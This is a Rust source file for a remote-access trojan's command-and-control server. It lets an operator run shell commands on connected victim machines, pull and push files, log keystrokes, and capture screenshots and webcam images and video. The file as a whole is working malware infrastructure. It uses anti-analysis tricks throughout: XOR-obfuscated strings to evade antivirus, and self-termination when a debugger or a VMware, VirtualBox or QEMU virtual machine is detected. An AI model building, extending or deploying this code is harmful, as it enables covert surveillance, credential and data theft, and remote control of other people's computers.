// C2 Server Implementation in Rust with Anti-AV Techniques

use std::collections::HashMap;
use std::sync::Arc;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, Mutex};
use serde::{Deserialize, Serialize};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;use std::io::Write;
use std::fs;
// Encrypted strings for anti-AV

const ENCRYPTION_KEY: [u8; 32] = [
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
];

const XOR_KEY: u8 = 0xAA;

const LISTENING_MSG_ENCRYPTED: [u8; 32] = [233,152,138,225,207,192,196,207,192,138,182,179,189,190,207,184,179,184,177,138,187,184,138,186,187,192,190,138,113,114,113,114];
const CLIENT_CONNECTED_MSG_ENCRYPTED: [u8; 19] = [233,182,179,207,184,190,138,155,157,138,175,187,184,184,207,175,190,207,204];
const CLIENT_DISCONNECTED_ENCRYPTED: [u8; 22] = [233,182,179,207,184,190,138,155,157,138,204,179,189,175,187,184,184,207,175,190,207,204];

fn decrypt_string(encrypted: &[u8]) -> String {
    encrypted.iter().map(|&b| (b ^ XOR_KEY) as char).collect()
}

fn is_vm() -> bool {
    #[cfg(windows)]
    {
        use winreg::RegKey;
        use winreg::enums::HKEY_LOCAL_MACHINE;
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
        if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
                if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
                    return true;
                }
            }
        }
    }
    false
}

fn encrypt(data: &[u8]) -> Vec<u8> {
    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
    let cipher = Aes256Gcm::new(&key);
    let nonce_bytes = rand::thread_rng().gen::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, data).unwrap();
    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    result
}

fn decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    if data.len() < 12 {
        return Err("Data too short".to_string());
    }
    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
    let cipher = Aes256Gcm::new(&key);
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher.decrypt(nonce, ciphertext).map_err(|_| "Decryption failed".to_string())
}

#[derive(Serialize, Deserialize, Debug, Clone)]
enum Command {
    Shell(String),
    Download(String),
    Upload { filename: String, data: Vec<u8> },
    Keylog,
    Screenshot,
    Webcam,
    WebcamStream,
    Exit,
}

#[derive(Serialize, Deserialize, Debug)]
enum Response {
    Success(String),
    Data { data: Vec<u8>, kind: String },
    Error(String),
}

struct Client {
    id: usize,
    stream: TcpStream,
}

async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>) {
    let mut buf = [0u8; 4096];
    loop {
        tokio::select! {
            Some(cmd) = rx.recv() => {
                let data = serde_json::to_vec(&cmd).unwrap();
                let encrypted = encrypt(&data);
                if client.stream.write_all(&encrypted).await.is_err() {
                    break;
                }
            }
            result = client.stream.read(&mut buf) => {
                match result {
                    Ok(0) => break,
                    Ok(n) => {
                        if let Ok(decrypted) = decrypt(&buf[..n]) {
                            if let Ok(resp) = serde_json::from_slice::<Response>(&decrypted) {
                                match resp {
                                    Response::Success(msg) => println!("Client {}: {}", client.id, msg),
                                    Response::Data { data, kind } => {
                                        let ext = match kind.as_str() {
                                            "screenshot" => "png",
                                            "webcam" => "png",
                                            "download" => "bin",
                                            "webcam_video" => "mp4",
                                            _ if kind.starts_with("webcam_stream") => "png",
                                            _ => "bin",
                                        };
                                        let filename = format!("client_{}_{}.{}", client.id, kind, ext);
                                        if fs::write(&filename, &data).is_ok() {
                                            println!("Client {}: Saved {} to {}", client.id, kind, filename);
                                        } else {
                                            println!("Client {}: Failed to save {}", client.id, kind);
                                        }
                                    }
                                    Response::Error(err) => println!("Client {}: Error: {}", client.id, err),
                                }
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
        }
    }
    println!("{}", decrypt_string(&CLIENT_DISCONNECTED_ENCRYPTED).replace("{}", &client.id.to_string()));
}

#[tokio::main]
async fn main() {
    #[cfg(windows)]
    {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        if unsafe { IsDebuggerPresent() }.as_bool() {
            std::process::exit(0);
        }
    }
    if is_vm() {
        std::process::exit(0);
    }
    println!("{}", decrypt_string(&LISTENING_MSG_ENCRYPTED));
    let listener = TcpListener::bind("0.0.0.0:7878").await.unwrap();
    let clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>> = Arc::new(Mutex::new(HashMap::new()));
    let clients_clone = clients.clone();
    tokio::spawn(async move {
        handle_user_input(clients_clone).await;
    });
    let mut client_id = 0;
    while let Ok((stream, _)) = listener.accept().await {
        let id = client_id;
        client_id += 1;
        println!("{}", decrypt_string(&CLIENT_CONNECTED_MSG_ENCRYPTED).replace("{}", &id.to_string()));
        let (tx, rx) = mpsc::channel(100);
        clients.lock().await.insert(id, tx);
        let client = Client { id, stream };
        tokio::spawn(async move {
            handle_client(client, rx).await;
        });
    }
}

async fn handle_user_input(clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>>) {
    loop {
        print!("C2> ");
        std::io::stdout().flush().unwrap();
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        if parts.is_empty() { continue; }
        match parts[0] {
            "list" => {
                let clients_lock = clients.lock().await;
                if clients_lock.is_empty() {
                    println!("No clients connected");
                } else {
                    println!("Connected clients:");
                    for (id, _) in clients_lock.iter() {
                        println!("  Client {}", id);
                    }
                }
            }
            "shell" => {
                if parts.len() < 3 { println!("Usage: shell <client_id> <command>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let cmd = parts[2..].join(" ");
                        let _ = tx.send(Command::Shell(cmd)).await;
                        println!("Sent shell command to client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "download" => {
                if parts.len() < 3 { println!("Usage: download <client_id> <filename>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Download(parts[2].to_string())).await;
                        println!("Requested download from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "keylog" => {
                if parts.len() < 2 { println!("Usage: keylog <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Keylog).await;
                        println!("Requested keylog from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "screenshot" => {
                if parts.len() < 2 { println!("Usage: screenshot <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Screenshot).await;
                        println!("Requested screenshot from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "webcam" => {
                if parts.len() < 2 { println!("Usage: webcam <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Webcam).await;
                        println!("Requested webcam from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }            "webcam_stream" => {
                if parts.len() < 2 { println!("Usage: webcam_stream <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::WebcamStream).await;
                        println!("Started webcam stream from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }            "exit" => {
                if parts.len() < 2 { println!("Usage: exit <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Exit).await;
                        println!("Sent exit command to client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "help" => {
                println!("Commands:");
                println!("  list - List connected clients");
                println!("  shell <id> <cmd> - Execute shell command on client");
                println!("  download <id> <file> - Download file from client");
                println!("  keylog <id> - Get keylog from client");
                println!("  screenshot <id> - Capture screenshot from client");
                println!("  webcam <id> - Capture webcam image from client");
                println!("  webcam_stream <id> - Record webcam video for ~2 seconds (saved as client_<id>_webcam_video.mp4)");
                println!("  exit <id> - Disconnect client");
                println!("  help - Show this help");
            }
            _ => println!("Unknown command. Type 'help' for help."),
        }
    }
}